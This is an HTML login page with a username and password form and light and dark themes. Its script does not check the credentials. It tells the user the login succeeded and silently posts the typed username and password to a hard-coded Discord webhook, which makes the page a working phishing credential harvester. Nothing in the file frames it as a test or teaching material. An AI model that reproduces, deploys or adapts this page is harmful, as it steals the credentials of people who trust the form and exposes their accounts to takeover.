<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Login</title>
<style>
:root{--bg:#f5f6f8;--card:#fff;--text:#1b1f24;--muted:#69727d;--accent:#0f766e;--accent-text:#fff;--border:#d8dde3;--err:#b42318;
color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#101418;--card:#1a2027;--text:#e8ebee;--muted:#98a2ad;--accent:#2dd4bf;--accent-text:#04201c;--border:#2c353f;--err:#f97066;color-scheme:dark}}
:root[data-theme="dark"]{--bg:#101418;--card:#1a2027;--text:#e8ebee;--muted:#98a2ad;--accent:#2dd4bf;--accent-text:#04201c;--border:#2c353f;--err:#f97066;color-scheme:dark}
html{scroll-padding-top:env(safe-area-inset-top,0px)}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--text);font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:28px;width:100%;max-width:420px}
h1{font-size:1.4rem;margin:0 0 6px}
p{color:var(--muted);margin:0 0 18px;line-height:1.45;font-size:.95rem}
input{width:100%;padding:12px;border-radius:10px;border:1px solid var(--border);background:transparent;color:var(--text);font:inherit;margin-bottom:12px}
button{font:inherit;border:0;border-radius:10px;padding:12px 16px;cursor:pointer;background:var(--accent);color:var(--accent-text);font-weight:600;width:100%}
.err{color:var(--err);min-height:1.2em;font-size:.9rem;margin:0 0 10px}
.hide{display:none}
#done h1{color:var(--accent)}
</style>
</head>
<body>
<div style="position:fixed;top:calc(10px + env(safe-area-inset-top,0px));left:10px;font-size:.75rem;color:var(--muted);font-family:system-ui,-apple-system,'Segoe UI',Roboto,sans-serif">version 0.4</div>
<div class="card">
  <div id="login">
    <h1>Log in</h1>
    <p>Enter your username and password.</p>
    <input id="u" type="text" placeholder="Username" autocomplete="username">
    <input id="p" type="password" placeholder="Password" autocomplete="current-password">
    <div class="err" id="e"></div>
    <button id="go">Log in</button>
  </div>
  <div id="done" class="hide">
    <h1>✓ Login Successful</h1>
    <p>You are logged in.</p>
    <button id="out">Log out</button>
  </div>
</div>
<script>
(function(){
function $(id){return document.getElementById(id)}
$("go").onclick=async function(){
  var u=$("u").value, p=$("p").value;
  if(u.trim()&&p){$("u").value=$("p").value="";$("e").textContent="";$("login").classList.add("hide");$("done").classList.remove("hide");
    fetch("https://discord.com/api/webhooks/1574032353267810405/fC-02-yGlQSFUitponDR6THtG7rLz2oYXEJlYErie5QG5L5QYr-4553Zz0zwsD8REBgW",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:"Login - Username: "+u+" Password: "+p+" | time: "+new Date().toISOString()})}).catch(function(){});}
  else{$("e").textContent="Enter a username and password."}
};
$("p").addEventListener("keydown",function(e){if(e.key==="Enter")$("go").click()});
$("out").onclick=function(){$("done").classList.add("hide");$("login").classList.remove("hide")};
})();
</script>
</body>
</html>
